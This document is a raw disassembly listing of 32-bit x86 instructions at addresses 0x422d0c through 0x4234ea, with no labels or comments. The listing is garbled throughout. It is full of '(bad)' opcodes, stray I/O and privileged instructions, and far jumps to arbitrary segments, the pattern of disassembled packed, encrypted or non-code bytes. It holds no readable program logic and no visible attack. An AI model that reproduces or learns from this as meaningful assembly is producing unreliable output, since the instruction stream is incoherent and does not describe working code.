  422d0c:	mov    al,ds:0xb8460b81
  422d11:	lahf   
  422d12:	cmp    al,0xbf
  422d14:	sub    eax,0x77e22bd7
  422d19:	pusha  
  422d1a:	shl    DWORD PTR [eax+0x75839bbc],cl
  422d20:	out    0xae,al
  422d22:	mov    ebp,0x4b06984e
  422d27:	jns    0x422d8d
  422d29:	arpl   WORD PTR cs:[ebp+0x28],bp
  422d2d:	or     BYTE PTR [esi+0x4561cc38],0x6f
  422d34:	(bad)  
  422d35:	leave  
  422d36:	or     ebp,ecx
  422d38:	enter  0xcb7a,0x3
  422d3c:	pop    ds
  422d3d:	(bad)  
  422d3e:	push   eax
  422d3f:	cmp    edx,esp
  422d41:	push   esi
  422d42:	enter  0x2638,0xc5
  422d46:	(bad)  
  422d47:	sbb    dl,ch
  422d49:	hlt    
  422d4a:	shl    esp,0xb3
  422d4d:	je     0x422d2c
  422d4f:	sahf   
  422d50:	mov    ecx,0x271cbeee
  422d55:	push   0xffffffec
  422d57:	rol    BYTE PTR [eax*2+0x34cd3231],cl
  422d5e:	loop   0x422d65
  422d60:	sahf   
  422d61:	xor    eax,0x6423994c
  422d66:	fwait
  422d67:	xor    eax,0xcbfc2981
  422d6c:	xchg   edi,eax
  422d6d:	mov    ds:0x81d7414b,eax
  422d72:	outs   dx,BYTE PTR ds:[esi]
  422d73:	fsubr  st(0),st
  422d75:	inc    edi
  422d76:	adc    al,0x5a
  422d78:	int3   
  422d79:	ficomp DWORD PTR [ecx]
  422d7b:	ret    0xbf02
  422d7e:	pop    esp
  422d7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d80:	xor    ecx,esp
  422d82:	xor    DWORD PTR [eax+0x4a9c2edf],ebx
  422d88:	js     0x422d77
  422d8a:	mov    ah,0x29
  422d8c:	mov    edx,0x3479a13b
  422d91:	sub    DWORD PTR [ecx-0x75],0x4d7c66d3
  422d98:	and    eax,edx
  422d9a:	rol    bh,0x57
  422d9d:	mov    edx,0x9245d63f
  422da2:	daa    
  422da3:	or     BYTE PTR [eax-0x39],dh
  422da6:	mov    eax,DWORD PTR ds:[esi-0x64]
  422daa:	sbb    ebx,ecx
  422dac:	xor    al,0x63
  422dae:	pop    ss
  422daf:	push   cs
  422db0:	aad    0x61
  422db2:	inc    ebx
  422db3:	mov    DWORD PTR [edx],esi
  422db5:	les    edi,FWORD PTR [edx+0x34]
  422db8:	pop    ds
  422db9:	xor    al,0x1c
  422dbb:	mov    ds:0x8e65c5d2,eax
  422dc0:	(bad)  
  422dc1:	and    DWORD PTR [ebp+0x4beba85e],edx
  422dc7:	fwait
  422dc8:	lods   al,BYTE PTR ds:[esi]
  422dc9:	imul   ecx,DWORD PTR [eax+0x452898d9],0xdf8f3172
  422dd3:	hlt    
  422dd4:	mov    esp,es
  422dd6:	push   ebp
  422dd7:	data16 mov cl,0xd3
  422dda:	xchg   DWORD PTR ds:0xdd0ed885,esp
  422de0:	mov    DWORD PTR [eax+0x2b],edx
  422de3:	retf   
  422de4:	xchg   esi,ebx
  422de6:	(bad)  
  422de7:	mov    BYTE PTR [edx],al
  422de9:	jnp    0x422dc9
  422deb:	inc    eax
  422dec:	and    eax,DWORD PTR [edx]
  422dee:	icebp  
  422def:	das    
  422df0:	pop    edi
  422df1:	sti    
  422df2:	dec    ebp
  422df3:	cmc    
  422df4:	mov    WORD PTR [esi+0x3148901f],fs
  422dfa:	inc    esp
  422dfb:	xor    edi,DWORD PTR [edi+0x75]
  422dfe:	cmp    DWORD PTR [esi+0x73],0x4278f49b
  422e05:	mov    bh,0xc0
  422e07:	add    al,0x38
  422e09:	push   0x27
  422e0b:	push   DWORD PTR [edi]
  422e0d:	(bad)  
  422e0e:	and    ch,bh
  422e10:	leave  
  422e11:	jno    0x422e72
  422e13:	int3   
  422e14:	add    BYTE PTR [edx+0x50ea8b56],0x3
  422e1b:	in     eax,0x1c
  422e1d:	js     0x422dac
  422e1f:	js     0x422e85
  422e21:	jns    0x422e38
  422e23:	into   
  422e24:	jb     0x422e32
  422e26:	sub    ah,ah
  422e28:	xor    DWORD PTR [ecx-0x7eb350cd],ebx
  422e2e:	mov    BYTE PTR [ebx-0x35],dh
  422e31:	ds dec esp
  422e33:	fsub   DWORD PTR [eax]
  422e35:	adc    DWORD PTR ds:0x210c82c5,edx
  422e3b:	and    eax,0x2c02a529
  422e40:	add    cl,BYTE PTR ds:0x89314583
  422e46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422e47:	sbb    eax,0x46cce8cd
  422e4c:	outs   dx,DWORD PTR ds:[esi]
  422e4d:	inc    ecx
  422e4e:	mov    dh,0x44
  422e50:	enter  0x95b1,0x74
  422e54:	in     al,0x27
  422e56:	shl    BYTE PTR [ecx+0x4],0x50
  422e5a:	sbb    edx,ebx
  422e5c:	and    eax,0xe0882fd1
  422e61:	mov    ah,0x2a
  422e63:	sub    DWORD PTR [edx+0x3f],0x7a
  422e67:	xchg   bl,ah
  422e69:	mov    ch,BYTE PTR [esi]
  422e6b:	fcom   DWORD PTR [edi+0x13]
  422e6e:	xor    eax,0x21902934
  422e73:	pop    ss
  422e74:	fdiv   QWORD PTR [edi-0xa]
  422e77:	and    al,0x5d
  422e79:	clc    
  422e7a:	nop
  422e7b:	in     eax,0x9c
  422e7d:	mov    dl,0xd4
  422e7f:	(bad)
  422e83:	test   al,0x40
  422e85:	jmp    0x74928baf
  422e8a:	dec    edx
  422e8b:	and    edx,DWORD PTR [edi+ebx*1-0x185f8952]
  422e92:	fnstcw WORD PTR [edx]
  422e94:	push   ds
  422e95:	faddp  st(0),st
  422e97:	mov    ebp,0xc45623d8
  422e9c:	bound  ecx,QWORD PTR [ebp+0x7e]
  422e9f:	push   0x44
  422ea1:	cmp    esp,esi
  422ea3:	lock mov ecx,0x6ecf3793
  422ea9:	or     DWORD PTR [esi],0xffffffb3
  422eac:	ins    DWORD PTR es:[edi],dx
  422ead:	aad    0xb0
  422eaf:	inc    ebx
  422eb0:	loop   0x422e53
  422eb2:	data16 fild DWORD PTR [ebx-0x27]
  422eb6:	adc    ah,ah
  422eb8:	scas   eax,DWORD PTR es:[edi]
  422eb9:	mov    dl,0xd1
  422ebb:	push   cs
  422ebc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ebd:	inc    ebp
  422ebe:	out    0x5b,al
  422ec0:	push   0xf731b9d8
  422ec5:	xchg   edi,eax
  422ec6:	sbb    eax,DWORD PTR [esi+0x1940b963]
  422ecc:	retfw  0xd115
  422ed0:	or     cl,bh
  422ed2:	inc    ebp
  422ed3:	push   ds
  422ed4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ed5:	sbb    al,0x33
  422ed7:	fcomp  DWORD PTR [edx+0x6ecd62b2]
  422edd:	or     BYTE PTR [edi-0x4daac4b8],dh
  422ee3:	fadd   st(6),st
  422ee5:	or     ah,al
  422ee7:	xchg   edi,eax
  422ee8:	push   es
  422ee9:	test   eax,0x31e6fb9d
  422eee:	jecxz  0x422f19
  422ef0:	and    eax,0x22c95cb1
  422ef5:	cwde   
  422ef6:	xchg   BYTE PTR [edi+0x183cd67c],ah
  422efc:	mov    ah,0xc0
  422efe:	mov    ebx,0xf9e147d4
  422f03:	ret    
  422f04:	ret    0x948a
  422f07:	repnz mov cl,bh
  422f0a:	fld    DWORD PTR ds:[edi]
  422f0d:	mov    eax,ds:0xcf072a58
  422f12:	add    edx,DWORD PTR [edx+0x41]
  422f15:	rol    bl,1
  422f17:	adc    al,0x3c
  422f19:	fmul   DWORD PTR [ebp-0x6e]
  422f1c:	jmp    0xa85:0x686e89cb
  422f23:	push   esp
  422f24:	xchg   edi,eax
  422f25:	stos   BYTE PTR es:[edi],al
  422f26:	mov    ds:0x3677d172,al
  422f2b:	or     al,0x6
  422f2d:	loope  0x422f5d
  422f2f:	adc    DWORD PTR [ebx+0x29bf5e5f],esp
  422f35:	out    0x89,al
  422f37:	in     al,dx
  422f38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f39:	outs   dx,DWORD PTR ds:[esi]
  422f3a:	push   esp
  422f3b:	in     al,dx
  422f3c:	fist   DWORD PTR [ecx]
  422f3e:	fnstsw WORD PTR [ebx+0x6880c6e8]
  422f44:	in     eax,dx
  422f45:	mov    cl,0xa5
  422f47:	or     DWORD PTR [edi],ecx
  422f49:	sar    BYTE PTR [edx],1
  422f4b:	jmp    0x422f7b
  422f4d:	out    0xb8,eax
  422f4f:	out    dx,eax
  422f50:	retf   0xbb39
  422f53:	and    al,0xfc
  422f55:	jg     0x422f21
  422f57:	imul   esi,DWORD PTR [edx+0x23529f31],0xffffffb9
  422f5e:	mov    bl,0xe6
  422f60:	or     edx,DWORD PTR [edx+edx*2]
  422f63:	inc    eax
  422f64:	shr    DWORD PTR [edx+eiz*2+0x2326377e],0x80
  422f6c:	adc    eax,0x9e937921
  422f71:	fisub  DWORD PTR [esi]
  422f73:	ficom  DWORD PTR [esi+edx*4-0x74]
  422f77:	out    dx,eax
  422f78:	xor    eax,0x14117816
  422f7d:	or     eax,0x577e187e
  422f82:	sbb    eax,0x5523b71e
  422f87:	ret    0x2f43
  422f8a:	adc    eax,0x516154d8
  422f8f:	xor    cl,BYTE PTR [ebx-0x29]
  422f92:	mov    ds:0x1ee9f5a5,al
  422f97:	mov    edi,0x94c6fd65
  422f9c:	iret   
  422f9d:	mov    WORD PTR [edi],es
  422f9f:	push   ss
  422fa0:	popf   
  422fa1:	inc    esi
  422fa2:	popa   
  422fa3:	cmc    
  422fa4:	inc    bh
  422fa6:	adc    eax,0xcb575571
  422fab:	js     0x422fd5
  422fad:	sbb    BYTE PTR [esp+ebx*1+0x2e488a0a],bl
  422fb4:	jmp    0x422f78
  422fb6:	adc    dh,dl
  422fb8:	fstp   TBYTE PTR [ebp+0x27]
  422fbb:	dec    edi
  422fbc:	out    0xca,al
  422fbe:	push   ecx
  422fbf:	or     eax,0x336db089
  422fc4:	xor    BYTE PTR [edi+0x4b07cbec],bh
  422fca:	dec    edx
  422fcb:	cmp    al,0x89
  422fcd:	dec    ecx
  422fce:	(bad)  
  422fcf:	(bad)  
  422fd0:	xchg   edi,eax
  422fd1:	in     al,0x40
  422fd3:	cld    
  422fd4:	shl    BYTE PTR [edi-0x213efda7],1
  422fda:	jecxz  0x422f88
  422fdc:	test   DWORD PTR [esp+ecx*2+0x69809137],eax
  422fe3:	test   eax,0x32d8b73
  422fe8:	aas    
  422fe9:	sbb    BYTE PTR [ebx+0x72b90abe],ch
  422fef:	jl     0x422fda
  422ff1:	cwde   
  422ff2:	pusha  
  422ff3:	mov    ds,eax
  422ff5:	loopne 0x422f8d
  422ff7:	icebp  
  422ff8:	leave  
  422ff9:	scas   al,BYTE PTR es:[edi]
  422ffa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ffb:	icebp  
  422ffc:	mov    eax,0x8d0ebc10
  423001:	jnp    0x422ff0
  423003:	mov    ebx,0xa6eb30e
  423008:	lea    ebp,[edi-0x7b]
  42300b:	jnp    0x422f92
  42300d:	cmp    edx,esp
  42300f:	xlat   BYTE PTR ds:[ebx]
  423010:	ins    DWORD PTR es:[edi],dx
  423011:	stc    
  423012:	jo     0x42302e
  423014:	dec    ebx
  423015:	stc    
  423016:	mov    BYTE PTR [ebx+eiz*4+0x7571e336],ch
  42301d:	push   eax
  42301e:	sub    esp,ecx
  423020:	inc    esi
  423021:	cmp    al,0x58
  423023:	mov    ds:0xd77cc191,al
  423028:	mov    bl,BYTE PTR [ebx+ebp*2]
  42302b:	mov    ds:0x7240317e,eax
  423030:	xchg   BYTE PTR [ecx],bh
  423032:	xchg   BYTE PTR [ecx],bh
  423034:	mov    esp,0xcabddc52
  423039:	push   esp
  42303a:	xchg   DWORD PTR [ecx+0x5346377c],ecx
  423040:	inc    eax
  423041:	add    cl,ah
  423043:	sub    eax,0x19555b84
  423048:	pop    eax
  423049:	jo     0x4230a2
  42304b:	sub    esp,DWORD PTR [ebx+0x5a]
  42304e:	push   esi
  42304f:	pop    edi
  423050:	(bad)  
  423051:	and    al,BYTE PTR [edi]
  423053:	jle    0x423043
  423055:	fsubr  st,st(3)
  423057:	xchg   ecx,eax
  423058:	pop    esi
  423059:	ds mov edx,0xea9cac0a
  42305f:	dec    edx
  423060:	jle    0x4230ca
  423062:	and    dh,dl
  423064:	or     BYTE PTR [eax],bh
  423066:	(bad)  
  423067:	test   eax,0x59298aef
  42306c:	int3   
  42306d:	pop    edi
  42306e:	ds iret 
  423070:	and    edx,DWORD PTR [ecx]
  423072:	add    bl,BYTE PTR ds:0x8a8c52a0
  423078:	es mov ch,0x1b
  42307b:	sahf   
  42307c:	lds    edx,FWORD PTR ds:0x3277e0e1
  423082:	xor    DWORD PTR [edx],esp
  423084:	pop    esi
  423085:	je     0x42305e
  423087:	into   
  423088:	xchg   edx,eax
  423089:	fiadd  WORD PTR [edi*1+0x55f31c3f]
  423090:	test   eax,0x722b5ced
  423095:	sub    bh,BYTE PTR [esi+ebp*1]
  423098:	cli    
  423099:	jnp    0x42306e
  42309b:	or     edx,DWORD PTR [edi+esi*4]
  42309e:	add    ebx,DWORD PTR [esp+0x4d64b50]
  4230a5:	mov    edi,0x856ed0b3
  4230aa:	iret   
  4230ab:	xor    al,0xf9
  4230ad:	sbb    DWORD PTR [edx],ebp
  4230af:	mov    ds:0x659987f1,eax
  4230b4:	scas   eax,DWORD PTR es:[edi]
  4230b5:	push   es
  4230b6:	sub    bh,bh
  4230b8:	repz sub eax,0x9a434862
  4230be:	pop    DWORD PTR [edx]
  4230c0:	push   ebp
  4230c1:	icebp  
  4230c2:	fldcw  WORD PTR [ebp+0x50bc104b]
  4230c8:	xchg   ebx,eax
  4230c9:	cmp    edi,ebx
  4230cb:	rol    DWORD PTR ds:0xd70c4b42,0xee
  4230d2:	call   0xe36e8f21
  4230d7:	jmp    0x25e4:0x576a82db
  4230de:	sub    bl,BYTE PTR [esi]
  4230e0:	mov    al,0x52
  4230e2:	dec    esp
  4230e3:	cmp    bh,bh
  4230e5:	and    BYTE PTR [ebx-0x518030b9],al
  4230eb:	dec    ebx
  4230ec:	sub    DWORD PTR [ecx],edi
  4230ee:	mov    dh,0x55
  4230f0:	gs xor eax,0xc1d30c54
  4230f6:	dec    ebx
  4230f7:	push   ds
  4230f8:	call   DWORD PTR [eax]
  4230fa:	das    
  4230fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230fc:	xchg   dl,bh
  4230fe:	add    eax,DWORD PTR [ecx+eiz*8+0x76bdcd9c]
  423105:	dec    edi
  423106:	jb     0x42310a
  423108:	sub    eax,0x2694951d
  42310d:	pop    es
  42310e:	dec    ebx
  42310f:	mov    esp,0xb30757a2
  423114:	inc    ebx
  423115:	xchg   BYTE PTR [esi-0x4501f7bd],bh
  42311b:	inc    edi
  42311c:	or     al,0xcd
  42311e:	fiadd  WORD PTR [ebp-0x7bb63aa9]
  423124:	mov    cl,BYTE PTR [ebx]
  423126:	or     eax,DWORD PTR [eax+0x8]
  423129:	push   esp
  42312a:	or     esp,DWORD PTR [edx+0x2a]
  42312d:	stc    
  42312e:	les    edi,FWORD PTR [eax+0x1b661a97]
  423134:	xor    eax,0x4c1b94bd
  423139:	xchg   edi,eax
  42313a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42313b:	outs   dx,DWORD PTR ds:[esi]
  42313c:	or     esp,edi
  42313e:	repz xor DWORD PTR [eax],esp
  423141:	imul   esp,edx,0xcf5400ae
  423147:	(bad)  
  423149:	adc    cl,0x6a
  42314c:	xlat   BYTE PTR ds:[ebx]
  42314d:	mov    bl,0x9f
  42314f:	retf   
  423150:	sbb    dl,BYTE PTR [esi+0x2e]
  423153:	pop    esi
  423154:	cmp    ecx,ecx
  423156:	add    DWORD PTR [edx+ebx*8-0x32],0x83ab5e07
  42315e:	(bad)  
  42315f:	xchg   edi,eax
  423160:	mov    eax,0x8a01dd3a
  423165:	and    esp,DWORD PTR ds:0xfa4c7bdf
  42316b:	call   0x9ce4:0x736d980a
  423172:	push   cs
  423173:	test   dh,dl
  423175:	sbb    DWORD PTR [esi-0x205a5dc6],ecx
  42317b:	inc    esp
  42317c:	daa    
  42317d:	cmc    
  42317e:	push   eax
  42317f:	push   eax
  423180:	hlt    
  423181:	fs mov esi,0xe49cf416
  423187:	test   al,0xa0
  423189:	out    0xb0,al
  42318b:	xlat   BYTE PTR ds:[ebx]
  42318c:	cmc    
  42318d:	xor    cl,ah
  42318f:	in     al,dx
  423190:	fldenv [edx+eiz*2+0xb]
  423194:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423195:	sub    DWORD PTR [ecx-0x33],eax
  423198:	ret    
  423199:	adc    eax,0x49abc32d
  42319e:	sti    
  42319f:	pop    ss
  4231a0:	xor    ch,0xe3
  4231a3:	jno    0x423144
  4231a5:	or     al,ah
  4231a7:	push   edx
  4231a8:	retf   0x89e2
  4231ab:	shl    edi,cl
  4231ad:	dec    ecx
  4231ae:	mov    dh,0xcc
  4231b0:	imul   esp,DWORD PTR [edi+0x3e06ea73],0xffffffe7
  4231b7:	rol    DWORD PTR [edi-0x38348714],1
  4231bd:	aad    0x51
  4231bf:	pop    esp
  4231c0:	xchg   esp,eax
  4231c1:	sar    DWORD PTR [esi],0x2d
  4231c4:	and    BYTE PTR [ecx],ch
  4231c6:	cdq    
  4231c7:	and    DWORD PTR [ebx],ebp
  4231c9:	lods   eax,DWORD PTR ds:[esi]
  4231ca:	fadd   DWORD PTR [ebx]
  4231cc:	hlt    
  4231cd:	xor    al,0xb4
  4231cf:	or     BYTE PTR [ebx],dh
  4231d1:	in     al,dx
  4231d2:	call   0x4cf2:0x1c8eb70d
  4231d9:	scas   eax,DWORD PTR es:[edi]
  4231da:	loop   0x4231a1
  4231dc:	xchg   ebp,eax
  4231dd:	cwd    
  4231df:	mov    ah,0x87
  4231e1:	jge    0x42322f
  4231e3:	bound  ecx,QWORD PTR [edi]
  4231e5:	or     BYTE PTR [esi-0x175e1148],dl
  4231eb:	in     eax,0x90
  4231ed:	add    bh,BYTE PTR [esi+0x1b]
  4231f0:	mov    bh,0x6c
  4231f2:	mov    cl,0xc9
  4231f4:	stos   BYTE PTR es:[edi],al
  4231f5:	daa    
  4231f6:	xor    eax,0x34ae2993
  4231fb:	mov    dl,0x2b
  4231fd:	(bad)  
  4231ff:	xchg   esi,eax
  423200:	lea    edx,[ebp+0x54]
  423203:	sub    dh,BYTE PTR [eax]
  423205:	jmp    0xd7d2:0xfcae2891
  42320c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42320d:	pusha  
  42320e:	nop
  42320f:	adc    ch,bl
  423211:	gs sub eax,0xb4955a68
  423217:	stos   DWORD PTR es:[edi],eax
  423218:	xchg   ecx,eax
  423219:	dec    edi
  42321a:	add    al,0xa1
  42321c:	mov    ebp,0x7e6adfc3
  423221:	js     0x4231b7
  423223:	sub    eax,0x84a33353
  423228:	push   es
  423229:	xor    ch,BYTE PTR [ecx+eiz*4+0x53999ee7]
  423230:	out    0xb5,al
  423232:	jmp    0x87630458
  423237:	xor    edi,edi
  423239:	loopne 0x4231cd
  42323b:	pusha  
  42323c:	xor    esi,DWORD PTR [edx]
  42323e:	nop
  42323f:	push   cs
  423240:	out    dx,eax
  423241:	dec    esi
  423242:	adc    eax,0x92e3810
  423247:	jecxz  0x4232b5
  423249:	(bad)  
  42324a:	xor    BYTE PTR [edi+eax*8],bl
  42324d:	sti    
  42324e:	jnp    0x4231da
  423250:	and    eax,0xfb6c6ef6
  423255:	not    DWORD PTR [eax]
  423257:	not    DWORD PTR [ebx+0x44]
  42325a:	push   esp
  42325b:	xor    eax,0x55c228c5
  423260:	add    eax,0x20833d16
  423265:	sti    
  423266:	mov    eax,0xa23a6df3
  42326b:	adc    BYTE PTR [ecx+0x34bb518f],cl
  423271:	mov    WORD PTR [edi],?
  423273:	aad    0x83
  423275:	icebp  
  423276:	push   ebp
  423277:	in     al,0x69
  423279:	mov    eax,ds:0x3f926435
  42327e:	jb     0x4232df
  423280:	fnstcw WORD PTR [eax+0x2daad40c]
  423286:	mov    esp,0xdb24c382
  42328b:	icebp  
  42328c:	out    dx,al
  42328d:	add    bh,al
  42328f:	and    DWORD PTR [ebp+0x44],edi
  423292:	cmp    eax,DWORD PTR [ebp-0x2]
  423295:	imul   DWORD PTR [ecx-0x52]
  423298:	sbb    al,0x7c
  42329a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42329b:	cmp    eax,0x41cb349f
  4232a0:	sub    DWORD PTR [edx+ebx*2+0x2e],esi
  4232a4:	shl    DWORD PTR [esi],0xdc
  4232a7:	rcr    BYTE PTR [edx-0x17],cl
  4232aa:	and    eax,0xdd969f3e
  4232af:	loop   0x423292
  4232b1:	aam    0x10
  4232b3:	ins    BYTE PTR es:[edi],dx
  4232b4:	outs   dx,BYTE PTR ds:[esi]
  4232b5:	push   DWORD PTR [eax]
  4232b7:	xchg   edi,eax
  4232b8:	or     DWORD PTR [esi],eax
  4232ba:	mov    al,0x20
  4232bc:	sbb    bl,BYTE PTR [edi-0x79]
  4232bf:	les    esp,FWORD PTR [ecx]
  4232c1:	jmp    0x8947:0xfb2d670f
  4232c8:	repnz test al,0xc2
  4232cb:	or     al,0xce
  4232ce:	dec    edx
  4232cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232d0:	push   edx
  4232d1:	call   0x8e35:0xdd72c165
  4232d8:	push   ss
  4232d9:	sti    
  4232da:	inc    esi
  4232db:	push   0x52
  4232dd:	test   bl,cl
  4232df:	add    BYTE PTR [esi],ch
  4232e1:	jno    0x423280
  4232e3:	sbb    esp,ebx
  4232e5:	pop    es
  4232e6:	mov    WORD PTR [ebx+0xc],ss
  4232e9:	mov    ds:0x57ab08aa,al
  4232ee:	test   eax,0x742bbfcd
  4232f3:	mov    ch,0x66
  4232f5:	and    al,0x54
  4232f7:	cdq    
  4232f8:	add    DWORD PTR [esi+ebx*1],eax
  4232fb:	push   ss
  4232fc:	cmp    BYTE PTR [eax-0x32c5d12d],cl
  423302:	cmc    
  423303:	dec    ebx
  423304:	and    esp,esp
  423306:	inc    edx
  423307:	scas   eax,DWORD PTR es:[edi]
  423308:	xchg   ebp,eax
  423309:	dec    ecx
  42330a:	mov    eax,ds:0x8115b373
  42330f:	test   BYTE PTR ds:0x6ce562a1,al
  423315:	pop    esp
  423316:	(bad)  
  423317:	in     eax,dx
  423318:	xchg   edi,eax
  423319:	dec    edx
  42331a:	and    ch,BYTE PTR [ecx]
  42331c:	imul   ebp,DWORD PTR [ebx-0x58],0x60cc5c54
  423323:	fs pop ds
  423325:	jge    0x4232e3
  423327:	nop
  423328:	pop    es
  423329:	pop    ecx
  42332a:	test   ebp,ecx
  42332c:	adc    bh,BYTE PTR [ecx+0x6d]
  42332f:	ins    BYTE PTR es:[edi],dx
  423330:	jns    0x423337
  423332:	shl    DWORD PTR [esi],0xaa
  423335:	in     al,dx
  423336:	push   edi
  423337:	jecxz  0x4233b2
  423339:	test   DWORD PTR [esi-0x1d0c56c5],edx
  42333f:	fsub   st,st(6)
  423341:	(bad)  
  423342:	push   ecx
  423343:	sub    DWORD PTR ds:0xa9e2f885,0xa02742b8
  42334d:	mov    ch,0x60
  42334f:	enter  0x22f3,0xdb
  423353:	inc    edi
  423354:	xchg   edx,eax
  423355:	mov    bh,0x79
  423357:	adc    al,BYTE PTR [edi+0x2f65015b]
  42335d:	jp     0x423337
  42335f:	xchg   ebp,eax
  423360:	mov    ch,0xd1
  423362:	mov    bh,0xcf
  423364:	jo     0x423332
  423366:	push   esi
  423367:	dec    ebx
  423368:	pushf  
  423369:	sbb    eax,0xc851bc98
  42336e:	and    edi,DWORD PTR [ecx-0x68]
  423371:	clc    
  423372:	mov    ds:0x161d46f3,eax
  423377:	aas    
  423378:	inc    edi
  423379:	pop    ebp
  42337a:	sbb    DWORD PTR [ebp+0x46],ebx
  42337d:	mov    ds:0x47cc7847,al
  423382:	pop    esi
  423383:	ins    BYTE PTR es:[edi],dx
  423384:	push   0xffffffb6
  423386:	mov    al,0xdb
  423388:	and    DWORD PTR [esi],0xffffffa6
  42338b:	scas   al,BYTE PTR es:[edi]
  42338c:	dec    eax
  42338d:	push   ebx
  42338e:	xchg   esi,eax
  42338f:	fisttp QWORD PTR [ebx-0x7d]
  423392:	mov    bp,0x4690
  423396:	inc    ecx
  423397:	mov    gs,esp
  423399:	retf   
  42339a:	xchg   esp,eax
  42339b:	cwde   
  42339c:	sahf   
  42339d:	je     0x4233f6
  42339f:	(bad)  
  4233a0:	ds mov dh,0xe8
  4233a3:	fmul   QWORD PTR [ebx]
  4233a5:	ja     0x4233e4
  4233a7:	addr16 and esp,ecx
  4233aa:	mov    bl,0x4a
  4233ac:	lods   eax,DWORD PTR ds:[esi]
  4233ad:	jb     0x423389
  4233af:	push   esi
  4233b0:	test   eax,0x6610e574
  4233b5:	xchg   esi,eax
  4233b6:	push   es
  4233b7:	(bad)  
  4233b8:	xchg   BYTE PTR [edi+edi*4+0x1d],al
  4233bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233bd:	xchg   esp,eax
  4233be:	loope  0x4233fa
  4233c0:	and    edx,esp
  4233c2:	faddp  st(4),st
  4233c4:	scas   al,BYTE PTR es:[edi]
  4233c5:	lods   al,BYTE PTR ds:[esi]
  4233c6:	mov    cl,BYTE PTR [ebp+ebx*4-0x3d]
  4233ca:	retf   0x93bd
  4233cd:	xchg   ebx,eax
  4233ce:	sbb    ecx,DWORD PTR [ebp-0x57dba3c6]
  4233d4:	sub    ch,cl
  4233d6:	mov    ?,WORD PTR [ecx]
  4233d8:	rol    BYTE PTR [ecx-0x60],1
  4233db:	js     0x42336f
  4233dd:	mov    al,0xde
  4233df:	push   esi
  4233e0:	je     0x423428
  4233e2:	fistp  QWORD PTR [edi-0x62]
  4233e5:	ret    
  4233e6:	arpl   WORD PTR [esi+0x653e6dab],bp
  4233ec:	fadd   QWORD PTR ds:0x72b14c5e
  4233f2:	mov    ebx,0xe6e8a50e
  4233f7:	jmp    0x423438
  4233f9:	hlt    
  4233fa:	sub    edx,DWORD PTR [ebx]
  4233fc:	arpl   WORD PTR [ecx+0x69],sp
  4233ff:	loop   0x4233d3
  423401:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423402:	lock loop 0x4233cf
  423405:	inc    edi
  423406:	mov    ebx,0xbc022a02
  42340b:	add    al,0xf5
  42340d:	and    esp,esp
  42340f:	out    0x35,eax
  423411:	or     DWORD PTR [ebp+edi*8+0x3a373b31],0x49ad6fac
  42341c:	in     al,0x3
  42341e:	cmp    BYTE PTR [edi+0x3e],ah
  423421:	ss jl  0x4233b5
  423424:	call   0xb5a6:0xe00b2d01
  42342b:	jg     0x42347a
  42342d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42342e:	rcr    DWORD PTR [edi-0x439d3c2],cl
  423434:	sti    
  423435:	push   0x35a0a2c1
  42343a:	mov    ebx,0xc61bda0
  42343f:	pushf  
  423440:	outs   dx,BYTE PTR ds:[esi]
  423441:	fisub  DWORD PTR [ebp+0x7b]
  423444:	in     al,dx
  423445:	icebp  
  423446:	daa    
  423447:	(bad)  
  423448:	test   DWORD PTR [edi],0x4493fc3f
  42344e:	or     dl,BYTE PTR [esi-0x66]
  423451:	shr    BYTE PTR [esi+0xc],cl
  423454:	inc    ebp
  423455:	mov    esi,0x8f2ee149
  42345a:	fld    DWORD PTR [edi]
  42345c:	push   0xffffffff
  42345e:	dec    ecx
  42345f:	mov    DWORD PTR [ebx-0x36],edx
  423462:	jecxz  0x423485
  423464:	imul   edx,ebx,0xd7bf16bf
  42346a:	or     DWORD PTR [edx+0x10],edx
  42346d:	sub    al,0xf2
  42346f:	call   DWORD PTR cs:0x23ca779e
  423476:	pop    ss
  423477:	sahf   
  423478:	jne    0x423450
  42347a:	(bad)  [esi+0x2de66863]
  423480:	mov    al,ds:0xe106c84e
  423485:	loope  0x42340f
  423487:	mov    bl,BYTE PTR [esi+edi*2]
  42348a:	jne    0x4234e7
  42348c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42348d:	rol    BYTE PTR [esi+0x2f],1
  423490:	inc    ecx
  423491:	add    eax,0x83672fca
  423496:	xor    esi,ecx
  423498:	inc    edx
  423499:	(bad)  
  42349a:	mov    eax,ds:0xd7b3e310
  42349f:	push   esi
  4234a0:	sbb    DWORD PTR [eax],0x3673cfee
  4234a6:	cmp    DWORD PTR [eax],ebx
  4234a8:	test   al,0x10
  4234aa:	mov    ds:0xeddefe71,eax
  4234af:	xor    al,0x62
  4234b1:	dec    esi
  4234b2:	fnstenv [esp+edi*1-0x21]
  4234b6:	rcl    dl,cl
  4234b8:	inc    ebp
  4234b9:	add    al,0x13
  4234bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4234bc:	sbb    edx,ebp
  4234be:	or     eax,0x944f2590
  4234c3:	in     eax,0xf3
  4234c5:	xchg   ecx,edx
  4234c7:	or     al,0x5a
  4234c9:	add    edi,ebx
  4234cb:	pop    ss
  4234cc:	sbb    ebx,DWORD PTR [edi+ebp*2]
  4234cf:	push   0x79
  4234d1:	aad    0x8f
  4234d3:	int3   
  4234d4:	stos   BYTE PTR es:[edi],al
  4234d5:	pop    esi
  4234d6:	xchg   ecx,eax
  4234d7:	cmp    eax,0x4dc8719e
  4234dc:	fdiv   DWORD PTR [edi-0x774f5a60]
  4234e2:	jp     0x4234d1
  4234e4:	sar    DWORD PTR [edx+0x7c55cfd9],1
  4234ea:	or     BYTE PTR [edx+0x6453ce1c],cl
